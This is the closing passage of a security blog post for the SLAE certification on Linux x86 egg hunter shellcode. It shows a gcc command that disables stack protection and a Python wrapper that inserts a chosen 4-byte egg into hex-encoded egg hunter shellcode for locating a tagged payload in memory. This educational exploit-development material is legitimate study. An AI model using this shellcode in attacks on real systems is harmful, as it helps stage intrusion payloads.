</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">gcc -fno-stack-protector -z execstack -m32 skeleton3.c -o egghunter3_exe</code></p><p>And it works..</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://smarinovic.github.io/assets/img/slae_00017.png" alt="egghunter 3 - final version" /></p><h2 id="wrapper">Wrapper</h2><p>In order to make Egg Hunter configurable to various shell codes and eggs we can use following python script which takes 4 letter egg and creates Egg Hunter code as well as egg to be added as prefix to shellcode:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>import sys

egghunter = "\\xbfEGG\\x31\\xc9\\x31\\xd2\\x66\\x81\\xca\\xff\\x0f\\x42\\x31\\xc0\\xb0\\x21\\x8d\\x5a\\x08\\xcd\\x80\\x3c\\xf2\\x74\\xed\\x39\\x3a\\x75\\xee\\x39\\x7a\\x04\\x75\\xe9\\x83\\xc2\\x08\\xff\\xe2";
# to be replaced--^^^ with 4 bytes egg

if len(sys.argv) != 2:
   print 'Usage: wrapper.py &lt;4 letter egg&gt;'
   sys.exit(-1)

elif len(sys.argv[1]) != 4:
   print 'Egg should be 4 bytes long'

else:
   egg =sys.argv[1]
   egg_final = "\\x" + egg[0].encode("hex") + "\\x" + egg[1].encode("hex") + "\\x" + egg[2].encode("hex") + "\\x" + egg[3].encode("hex")
   egghunter = egghunter.replace("EGG", egg_final)
   print "Egghunter: " + egghunter
   print "Add: " + egg_final + egg_final + "  at beginning of shell code"
</pre></table></code></div></div><h2 id="references">References</h2><ul><li><a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">Skape - Safely Searching Process Virtual Address Space</a></li><li><a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/">Corlean - exploit writing tutorial</a></li><li><a href="https://artfromcode.wordpress.com/2018/03/23/slae-assignment-3-the-egg-hunter/">Art from code blog</a></li><li><a href="https://illegalbytes.com/2018-03-20/slae-assignment-3-linux-x86-egghunting/">IllegalBytes blog</a></li><li><a href="https://coffeegist.com/security/slae-exam-3-egg-hunter-shellcode/">Coffeegist blog</a></li><li><a href="https://medium.com/@ryukeackerman/securitytube-linux-assembly-expert-slae-assignment-writeups-x03-egg-hunter-shellcode-ea53bf7a12eb">Ryuke Ackerman’s blog</a></li><li><a href="https://github.com/h0mbre/h0mbre.github.io/blob/master/_posts/2019-05-08-SLAE_Egg_Hunter.md">H0mbre’s blog</a></li></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/blogging/'>Blogging</a>, <a href='/categories/tutorial/'>Tutorial</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/slae/" class="post-tag no-text-decoration" >slae</a> <a href="/tags/shellcoding/" class="post-tag no-text-decoration" >shellcoding</a> <a href="/tags/egghunter/" class="post-tag no-text-decoration" >egghunter</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Egg Hunter - Yet another cyber security blog&url=https://smarinovic.github.io/posts/EggHunter/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Egg Hunter - Yet another cyber security blog&u=https://smarinovic.github.io/posts/EggHunter/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Egg Hunter - Yet another cyber security blog&url=https://smarinovic.github.io/posts/EggHunter/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/shellcoding/">shellcoding</a> <a class="post-tag" href="/tags/slae/">slae</a> <a class="post-tag" href="/tags/fuzzing/">fuzzing</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/bufferoverflow/">bufferoverflow</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/encoder/">encoder</a> <a class="post-tag" href="/tags/egghunter/">egghunter</a> <a class="post-tag" href="/tags/decoder/">decoder</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Reverse-shell/" class="btn btn-outline-primary"><p>Linux reverse shell in assembly</p></a> <a href="/posts/Custom-Encoder/" class="btn btn-outline-primary"><p>Custom Encoder</p></a></div><!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Bind-shell/"><div class="card-body"> <span class="timeago small"> May 23, 2020 <i class="unloaded">2020-05-23T01:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Linux bind shell in assembly</h3><div class="text-muted small"><p>Introduction Objective of this blog post is to explain process of creating bind shell in assembly language for 32 bit Linux. Blog post was created for the SLAE certification exam and it describes...</p></div></div></a></div><div class="card"> <a href="/posts/Reverse-shell/"><div class="card-body"> <span class="timeago small"> May 27, 2020 <i class="unloaded">2020-05-27T17:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Linux reverse shell in assembly</h3><div class="text-muted small"><p>Introduction Objective of this blog post is to explain process of creating reverse shell in assembly language for 32 bit Linux. Blog post was created for the SLAE certification exam and it descri...</p></div></div></a></div><div class="card"> <a href="/posts/Custom-Encoder/"><div class="card-body"> <span class="timeago small"> Jun 10, 2020 <i class="unloaded">2020-06-10T16:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Custom Encoder</h3><div class="text-muted small"><p>Introduction Sending well known shell code to target machine would most probably be detected by antimalware solution . One way to bypass antimalware detection is to encode shell code and to have ...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const observer = lozad(); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://twitter.com/stipemarinovic">Stipe Marinovic</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy/">Chirpy</a>.</p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted">Trending Tags</h4><!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/shellcoding/">shellcoding</a> <a class="post-tag" href="/tags/slae/">slae</a> <a class="post-tag" href="/tags/fuzzing/">fuzzing</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/bufferoverflow/">bufferoverflow</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/encoder/">encoder</a> <a class="post-tag" href="/tags/egghunter/">egghunter</a> <a class="post-tag" href="/tags/decoder/">decoder</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-11473652-4', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://smarinovic.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
